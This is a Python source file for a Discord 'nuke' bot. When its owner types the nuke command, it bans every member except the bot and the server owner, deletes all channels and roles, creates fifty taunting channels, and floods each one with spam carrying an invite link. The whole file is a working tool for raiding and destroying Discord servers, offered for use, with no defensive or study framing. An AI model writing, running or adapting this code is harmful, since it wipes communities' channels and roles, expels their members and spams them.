import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system, environ
from sys import exit
import random
import asyncio

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

SPAM_MESSAGE = "010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid"

async def delete_all_channels(guild):
    deleted = 0
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            deleted += 1
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    tasks = []
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            tasks.append(role.delete())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            deleted += 1
    return deleted

async def ban_all_members(guild):
    banned = 0
    tasks = []
    for member in guild.members:
        if member != guild.me and member != guild.owner:
            tasks.append(member.ban())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            banned += 1
    return banned

async def spam_channel(channel):
    while True:
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.1) # Small delay to avoid immediate ban
        except:
            break

async def create_nuke_channels(guild):
    created_channels = []
    names = [
        "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
        "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓",
        "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃",
        "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"
    ]
    tasks = []
    for _ in range(50):
        tasks.append(guild.create_text_channel(name=random.choice(names)))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            created_channels.append(res)
    return created_channels

async def nuke_guild(guild):
    print(f'{r}[!] Starting nuke on: {m}{guild.name}')
    
    # 1. Ban members
    banned = await ban_all_members(guild)
    print(f'{m}[+] Banned: {b}{banned}')
    
    # 2. Delete channels
    deleted_channels = await delete_all_channels(guild)
    print(f'{m}[+] Deleted Channels: {b}{deleted_channels}')
    
    # 3. Delete roles
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}[+] Deleted Roles: {b}{deleted_roles}')
    
    # 4. Create channels and start spamming
    channels = await create_nuke_channels(guild)
    print(f'{m}[+] Created Channels: {b}{len(channels)}')
    
    print(f'{y}[!] Starting spam in all channels...')
    for channel in channels:
        asyncio.create_task(spam_channel(channel))
    
    print(f'{r}--------------------------------------------\n\n')

# Main entry point
token = environ.get('DISCORD_BOT_TOKEN')
prefix = environ.get('DISCORD_PREFIX', '.')

if not token:
    print(f"{r}[!] DISCORD_BOT_TOKEN not found in secrets!")
    exit()

client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@client.event
async def on_ready():
    clear()
    print(baner)
    print(f'''
{c}--------------------------------------------
{g}[+] Logged in as {client.user}
{g}[+] Total Servers: {len(client.guilds)}
{y}[!] Command: {prefix}nuke
{c}--------------------------------------------''')

@client.command()
async def nuke(ctx):
    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild)

try:
    client.run(token)
except Exception as e:
    print(f'{r}[!] Critical Error: {e}')
